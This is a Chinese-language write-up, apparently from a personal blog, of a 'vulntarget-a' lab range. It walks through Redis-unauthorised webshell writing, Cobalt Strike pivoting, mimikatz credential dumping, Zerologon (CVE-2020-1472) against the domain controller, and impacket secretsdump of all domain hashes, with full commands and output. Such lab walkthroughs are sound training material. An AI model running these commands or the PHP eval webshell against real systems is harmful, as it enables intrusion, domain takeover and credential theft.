+<h2 id="Windows-Server-2016"><a href="#Windows-Server-2016" class="headerlink" title="Windows Server 2016"></a>Windows Server 2016</h2><img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507134325722-1778169646449-15.png" class="" title="image-20260507134325722" loading='lazy'>
+
+<p>前面针对win7进行信息收集时发现了两个网卡，有个内网网段10.0.20.0&#x2F;24接下来我们对其进行探索。</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507141623201-1778169646449-16.png" class="" title="image-20260507141623201" loading='lazy'>
+
+<p>利用cs的端口扫描功能进行探测，win-2016无法ping不通所以无法使用网络探测而选择端口扫描，使用端口扫描进行信息收集</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507141928721-1778169646449-18.png" class="" title="image-20260507141928721" loading='lazy'>
+
+<p>可以看到10.0.20.99和10.0.20.98两个机器开启的端口服务，10.0.20.98为当前win7主机所以我们就重点关注10.0.20.99这个ip的端口服务，其中开启了两个端口分别是80和5985，但是这个信息应该是不全的于是我们通过蚁剑将fscan上传到win7之中使用指令fscan -h 10.0.20.99 -p all进行一个全端口扫描</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507152611383-1778169646449-19.png" class="" title="image-20260507152611383" loading='lazy'>
+
+<p>fscan扫描出来的内容因为编码问题无法识别扔给ai即可</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507152646479-1778169646449-20.png" class="" title="image-20260507152646479" loading='lazy'>
+
+<p>上传fscan还是太麻烦了于是开始尝试搭建代理来访问靶机的内网。</p>
+<p>在 Beacon 里执行：</p>
+<p>socks 1080</p>
+<p>或者：</p>
+<p>socks 1080 socks5 disableNoAuth</p>
+<p>成功后：</p>
+<p>CS 会在 TeamServer 开一个 SOCKS 代理端口</p>
+<p>配置 proxychains（Kali）</p>
+<p>编辑：vi &#x2F;etc&#x2F;proxychains.conf</p>
+<p>最后加：socks5 127.0.0.1 1080（注意cs默认的是socks4所以如果不设置socks5最后应该改成socks4）</p>
+<p>最后文件内容应该是</p>
+<p>[ProxyList]<br>socks4 127.0.0.1 1080</p>
+<p>之后即可使用kali进行做题</p>
+<p>使用namp 进行查询proxychains nmap -Pn -sT 10.0.20.99</p>
+<p>proxychains nmap -sT -Pn -p- 10.0.20.99进行全端口扫描（注意搭建的代理必须使用-sT）</p>
+<p><img src="/../../../../%25E5%25AD%25A6%25E4%25B9%25A0%25E8%25AE%25B0%25E5%25BD%2595/%25E9%259D%25B6%25E5%259C%25BA%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595/%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F/vulntarget-a/image-20260507193942167.png" alt="image-20260507193942167" loading='lazy'></p>
+<p>我们可以看到信息之中有redis未授权访问也就是说我们可以尝试一下往redis中写入木马来进入win2016机器之中</p>
+<p>在kali中执行：proxychains redis-cli -h 10.0.20.99          </p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507194156404-1778169646449-21.png" class="" title="image-20260507194156404" loading='lazy'>
+
+<p>可以看到成功执行进入redis</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/…/Desktop/tools/fscan/fscan-main]</span><br><span class="line">└─# proxychains redis-cli -h 10.0.20.99     </span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.0.20.99:6379  ...  OK</span><br><span class="line">10.0.20.99:6379&gt;  config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;   /**修改 Redis 的持久化文件保存目录**/</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename tx.php /**修改 Redis 持久化文件名**/</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set 1 &quot;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt;  save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>成功写入webshell，密码为attack</p>
+<p>之后使用蚁剑连接即可，注意需要配置代理服务器。</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507194823476-1778169646449-23.png" class="" title="image-20260507194823476" loading='lazy'>
+
+<p>配置好代理后我们可以看到连接成功</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507194905959-1778169646449-26.png" class="" title="image-20260507194905959" loading='lazy'>
+
+<p>这时候证明我们已经打入了win2016这台机器，之后我们只需要将其让cs上上线，这里和win7不通因为win2016无法访问我们的kali，他们不在同一个内网网段之中。</p>
+<p>所以我们在这里应该更改一下监听器改成tcp模式的</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507203123818-1778169646449-27.png" class="" title="image-20260507203123818" loading='lazy'>
+
+<p>然后我生成payload，注意在蚁剑中执行的时候需要在win7中进行连接操作</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507203221511-1778169646449-24.png" class="" title="image-20260507203221511" loading='lazy'>
+
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507203234545-1778169646449-25.png" class="" title="image-20260507203234545" loading='lazy'>
+
+<p>这样就能将win2016上线到cs上</p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>我们现在已经将windows server 2016上线到了cs上那么接下来就需要在里面进行一波信息收集探查下信息</p>
+<p>使用cs自己的功能抓取hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>抓取明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">[05/07 09:52:55] beacon&gt; logonpasswords</span><br><span class="line">[05/07 09:52:55] [*] Tasked beacon to run mimikatz&#x27;s sekurlsa::logonpasswords command</span><br><span class="line">[05/07 09:52:55] [+] host called home, sent: 297594 bytes</span><br><span class="line">[05/07 09:52:56] [+] received output:</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1853447 (00000000:001c4807)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : win2016</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : WIN2019</span><br><span class="line">Logon Time        : 2026/5/7 14:12:27</span><br><span class="line">SID               : S-1-5-21-3795598892-1521228294-2653055093-1601</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000005] Primary</span><br><span class="line">	 * Username : win2016</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line">	 * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line">	 * DPAPI    : 27bd7cc4802079a6e008ed2d917c4323</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : win2016</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win2016</span><br><span class="line">	 * Domain   : VULNTARGET.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 63557 (00000000:0000f845)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:51</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000005] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * NTLM     : 98d18188cf4f0c7391687b03ca3f1138</span><br><span class="line">	 * SHA1     : a58876718d4c88edcf73f2b39d3542c1f753d863</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : vulntarget.com</span><br><span class="line">	 * Password : fb e5 c2 66 4c c5 27 8b 84 9d cc 37 36 8d 87 d9 e5 fc 19 31 a4 63 e1 29 de f1 5c 4e c2 53 8e c2 73 af 8f 2d 91 46 db 91 fa d8 6b 36 3f d4 eb e7 45 dc d7 51 f3 c6 36 fd ad b1 07 23 6b b1 11 94 ea 6e 86 a3 ce 66 86 c2 2f fa b7 e2 9c 94 e3 b2 34 be b2 c6 95 4d 87 4c e7 05 44 5a 53 47 ac 69 75 c6 62 c3 c6 fc 15 f1 ee 3d e9 3c 77 c0 08 3c 02 50 d4 1d ea 3c db bb ad b8 0c ce fc 5d 45 53 1d 93 9a 57 87 80 25 00 87 25 a6 ec 4d 8e 2c 50 7d 66 58 1e 19 76 d3 f2 9e 07 48 0b b3 5d 5e 1f a4 bb 50 8b 03 63 37 66 9b dc 19 3a e4 99 be 49 e4 41 e1 52 6f 8d 6f 12 b3 b1 db 48 fe 4a cc ca 66 e3 1a 45 ba 40 15 8f 35 77 52 8d 5a 50 d7 60 5e 95 b5 dd bf b2 e6 5c 94 00 eb 21 81 da 7f 2a 44 59 ec 41 7e 29 ff f2 14 de 02 9a a9 3d 43 0a </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:50</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000005] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * NTLM     : 98d18188cf4f0c7391687b03ca3f1138</span><br><span class="line">	 * SHA1     : a58876718d4c88edcf73f2b39d3542c1f753d863</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win2016$</span><br><span class="line">	 * Domain   : VULNTARGET.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 40882 (00000000:00009fb2)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:50</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000005] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * NTLM     : 98d18188cf4f0c7391687b03ca3f1138</span><br><span class="line">	 * SHA1     : a58876718d4c88edcf73f2b39d3542c1f753d863</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:51</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 63622 (00000000:0000f886)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:51</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000005] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * NTLM     : 98d18188cf4f0c7391687b03ca3f1138</span><br><span class="line">	 * SHA1     : a58876718d4c88edcf73f2b39d3542c1f753d863</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : vulntarget.com</span><br><span class="line">	 * Password : fb e5 c2 66 4c c5 27 8b 84 9d cc 37 36 8d 87 d9 e5 fc 19 31 a4 63 e1 29 de f1 5c 4e c2 53 8e c2 73 af 8f 2d 91 46 db 91 fa d8 6b 36 3f d4 eb e7 45 dc d7 51 f3 c6 36 fd ad b1 07 23 6b b1 11 94 ea 6e 86 a3 ce 66 86 c2 2f fa b7 e2 9c 94 e3 b2 34 be b2 c6 95 4d 87 4c e7 05 44 5a 53 47 ac 69 75 c6 62 c3 c6 fc 15 f1 ee 3d e9 3c 77 c0 08 3c 02 50 d4 1d ea 3c db bb ad b8 0c ce fc 5d 45 53 1d 93 9a 57 87 80 25 00 87 25 a6 ec 4d 8e 2c 50 7d 66 58 1e 19 76 d3 f2 9e 07 48 0b b3 5d 5e 1f a4 bb 50 8b 03 63 37 66 9b dc 19 3a e4 99 be 49 e4 41 e1 52 6f 8d 6f 12 b3 b1 db 48 fe 4a cc ca 66 e3 1a 45 ba 40 15 8f 35 77 52 8d 5a 50 d7 60 5e 95 b5 dd bf b2 e6 5c 94 00 eb 21 81 da 7f 2a 44 59 ec 41 7e 29 ff f2 14 de 02 9a a9 3d 43 0a </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2026/5/7 13:16:50</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : VULNTARGET</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win2016$</span><br><span class="line">	 * Domain   : VULNTARGET.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br></pre></td></tr></table></figure>
+
+<p>可以看见这里的密码是域控随机生成、存储在活动目录中的 256 字节的二进制密钥</p>
+<p>shell net time &#x2F;domain—–使用该指令确定域控名字</p>
+<p>shell net time &#x2F;domain—–获取域控ip</p>
+<p>查找域控计算机名 <code>net group &quot;domain controllers&quot; /domain</code></p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507204257618-1778169646449-28.png" class="" title="image-20260507204257618" loading='lazy'>
+
+<h2 id="windows-sever-2019"><a href="#windows-sever-2019" class="headerlink" title="windows sever 2019"></a>windows sever 2019</h2><p>之后上传fscan进行探查</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507205015893-1778169646449-29.png" class="" title="image-20260507205015893" loading='lazy'>
+
+<p>由于编码问题只能让ai解析一下再去看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Fscan Version: 2.0.1</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:44:59] [INFO] 开始信息扫描</span><br><span class="line">[2026-05-07 20:44:59] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2026-05-07 20:44:59] [INFO] 开始主机扫描</span><br><span class="line">[2026-05-07 20:44:59] [INFO] 使用所有可用插件（已排除本地敏感插件）</span><br><span class="line">[2026-05-07 20:44:59] [INFO] 有效端口数量: 233</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:45:02] [SUCCESS] 端口开放 10.0.10.110:88</span><br><span class="line">[2026-05-07 20:45:02] [SUCCESS] 端口开放 10.0.10.110:135</span><br><span class="line">[2026-05-07 20:45:02] [SUCCESS] 端口开放 10.0.10.110:139</span><br><span class="line">[2026-05-07 20:45:02] [SUCCESS] 端口开放 10.0.10.110:389</span><br><span class="line">[2026-05-07 20:45:05] [SUCCESS] 端口开放 10.0.10.110:445</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:46:08] [INFO] 存活端口数量: 5</span><br><span class="line">[2026-05-07 20:46:08] [INFO] 开始漏洞扫描</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:46:08] [SUCCESS] NetBios 10.0.10.110 DC:VULNTARGET\WIN2019</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:46:08] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 10.0.10.110</span><br><span class="line">主机名: win2019</span><br><span class="line"></span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └── 10.0.10.110</span><br><span class="line"></span><br><span class="line">[2026-05-07 20:46:53] [SUCCESS] 扫描已完成: 9/9</span><br></pre></td></tr></table></figure>
+
+<p>也没有发现什么有用的信息，那么就搭建代理去使用kali进行操作</p>
+<p>之后没有什么别的信息于是怀疑是CVE-2020-1472</p>
+<p>参考文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13678055.html">https://www.cnblogs.com/xiaozi/p/13678055.html</a></p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507225412589-1778169646449-30.png" class="" title="image-20260507225412589" loading='lazy'>
+
+<p>判断确实有该漏洞，利用脚本<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py">https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py</a></p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507230713607-1778169646449-32.png" class="" title="image-20260507230713607" loading='lazy'>
+
+<p>ok当前域已经被制空了</p>
+<p>之后使用proxychains impacket-secretsdump vulntarget.com&#x2F;win2019$@10.0.10.110 -no-pass -just-dc，这条指令从域控 WIN2019 上“模拟域复制行为”，导出域内所有用户哈希（包括管理员）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/CVE-2020-1472]</span><br><span class="line">└─# proxychains impacket-secretsdump vulntarget.com/win2019\$@10.0.10.110 -no-pass -just-dc</span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1082  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1082  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1082  ...  10.0.10.110:49667  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:98d18188cf4f0c7391687b03ca3f1138:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:3f89b35414d6759a26d3d06aa58659ccf7260f87021dbd8434697ada21f90a5a</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:5856674a0769b6b29551f053cfb933f3</span><br><span class="line">WIN2016$:des-cbc-md5:8f25e602198c8534</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
